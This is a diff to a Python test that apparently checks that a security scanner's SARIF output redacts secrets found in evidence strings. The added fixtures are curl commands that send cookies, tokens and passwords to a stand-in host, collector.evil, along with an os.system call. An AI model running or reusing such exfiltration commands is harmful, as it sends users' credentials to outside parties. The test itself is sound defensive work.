@@ -876,6 +876,9 @@ def test_catboost_sarif_redacts_non_url_secret_evidence(tmp_path: Path) -> None:
                 ),
                 'curl -H "Cookie: foo=bar; session=CATBOOST_COOKIE_HEADER_SECRET" https://collector.evil/upload',
                 "curl --cookie session=CATBOOST_COOKIE_OPTION_SECRET https://collector.evil/upload",
+                "curl -bsession=hunter2 https://collector.evil/upload",
+                'PGPASSWORD=CATBOOST_PG_PASSWORD_SECRET os.system("id")',
+                "curl https://collector.evil/upload?githubtoken=CATBOOST_GITHUB_TOKEN_SECRET",
                 'curl --json \'{"password":"CATBOOST_JSON_BODY_SECRET"}\' https://collector.evil/upload',
                 ("curl https://collector.evil/upload?data=%7B%22api_key%22%3A%22CATBOOST_QUERY_JSON_SECRET%22%7D"),
                 "curl https://collector.evil/upload?aws.secret.access.key=CATBOOST_DOTTED_QUERY_SECRET",
@@ -945,6 +948,9 @@ def test_catboost_sarif_redacts_non_url_secret_evidence(tmp_path: Path) -> None:
     assert "CATBOOST_KEYUNPACKUNKNOWN_SECRET" not in sarif
     assert "CATBOOST_COOKIE_HEADER_SECRET" not in sarif
     assert "CATBOOST_COOKIE_OPTION_SECRET" not in sarif
+    assert "hunter2" not in sarif
+    assert "CATBOOST_PG_PASSWORD_SECRET" not in sarif
+    assert "CATBOOST_GITHUB_TOKEN_SECRET" not in sarif
     assert "CATBOOST_JSON_BODY_SECRET" not in sarif
     assert "CATBOOST_QUERY_JSON_SECRET" not in sarif
     assert "CATBOOST_DOTTED_QUERY_SECRET" not in sarif
